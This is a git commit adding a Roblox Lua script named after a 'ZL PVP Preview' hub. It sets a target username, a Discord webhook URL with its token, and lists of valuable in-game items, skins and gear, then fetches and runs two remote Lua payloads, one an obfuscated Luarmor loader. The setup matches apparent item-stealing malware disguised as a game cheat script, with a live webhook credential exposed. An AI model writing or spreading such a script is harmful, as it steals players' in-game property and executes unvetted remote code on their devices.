7f948c47038b2524b3eb3c2ea9a1405c77cae7f0
sab-api <carlosignaa2019@gmail.com>
2026-08-29 13:38:34 -0400

    Add script loadstringgameHttpGethttpsrawgithubusercontentcomxspeedHub0ZlhubmainZLPVPreviewlua_1788025113776.lua

---
+++ scripts/loadstringgameHttpGethttpsrawgithubusercontentcomxspeedHub0ZlhubmainZLPVPreviewlua_1788025113776.lua
@@ -0,0 +1,102 @@
+-- Mode: CUSTOM
+getgenv().TARGET_USERNAME = "Cesartingue"
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1537576324669907085/AbCpE2E8HU2loar4KJa-CNCjeXEcfWjDMBrROZGKqToBGTDDoFZxcMAl7E4RErdl57-B"
+getgenv().NORMAL_BRAINROTS = {
+    ["Meowl"] = true,
+    ["John Pork"] = true,
+    ["Spyder Elephant"] = true,
+    ["Headless Horseman"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Garama and Madundung"] = true,
+    ["Burguro And Fryuro"] = true,
+    ["Cash or Card"] = true,
+    ["Celestial Pegasus"] = true,
+    ["Cerberus"] = true,
+    ["Caylusaurus"] = true,
+    ["Capitano Moby"] = true,
+    ["Chillin Chili"] = true,
+    ["Cooki and Milki"] = true,
+    ["Digi Narwhal"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Dragon Aquanini"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Dug dug dug"] = true,
+    ["Duggy Bros"] = true,
+    ["Foxini Lanternini"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Fragola La La La"] = true,
+    ["Fortunu and Cashuru"] = true,
+    ["La Casa Boo"] = true,
+    ["La Food Combinasion"] = true,
+    ["La Ginger Sekolah"] = true,
+    ["La Secret Combinasion"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Los Jolly Combinasionas"] = true,
+    ["Los Hotspotsitos"] = true,
+    ["Los Hackers"] = true,
+    ["Los Sekolahs"] = true,
+    ["Los Spooky Combinasionas"] = true,
+    ["Los Primos"] = true,
+    ["Los Tacoritas"] = true,
+    ["Orcaledon"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Steakini Fattini"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Tralaledon"] = true,
+    ["W or L"] = true,
+    ["Tuff Toucan"] = true,
+    ["Capitano Americano"] = true,
+    ["Los Admins"] = true,
+    ["Grabatron"] = true,
+    ["Examen Bros"] = true,
+    ["Los Secret Combinasionas"] = true
+}
+getgenv().NORMAL_BASE_SKINS = {
+    ["Rose"] = true,
+    ["Gingerbread"] = true,
+    ["Halloween"] = true,
+    ["Christmas"] = true,
+    ["Bunny Basket"] = true,
+    ["Summer"] = true,
+    ["Pot of Gold"] = true,
+    ["Taco"] = true,
+    ["Octo"] = true,
+    ["Valentines"] = true,
+    ["Easter"] = true,
+    ["Lucky"] = true,
+    ["Aquatic"] = true,
+    ["Tralalero"] = true
+}
+getgenv().NORMAL_GEARS = {
+    ["Santa's Sleigh"] = true,
+    ["Cupid's Wings"] = true,
+    ["Witch's Broom"] = true,
+    ["Waverider"] = true,
+    ["Yin Yang Slap"] = true,
+    ["Cursed Slap"] = true,
+    ["Cyber Slap"] = true,
+    ["Divine Slap"] = true,
+    ["Bloodmoon Slap"] = true,
+    ["Radioactive Slap"] = true,
+    ["Rainbow Slap"] = true,
+    ["Rainbow Hammer"] = true,
+    ["Bloodmoon Hammer"] = true,
+    ["Radioactive Airstrike"] = true,
+    ["Yin Yang Lamp"] = true,
+    ["Demon's Head"] = true,
+    ["Lava Slap"] = true,
+    ["Lava Blaster"] = true,
+    ["Alien Slap"] = true,
+    ["Blackhole Bomb"] = true,
+    ["Candy Sentry"] = true,
+    ["Phantom Slap"] = true
+}
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
+end)
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xspeedHub0/Zlhub/main/ZLPVPreview.lua"))()
+end)
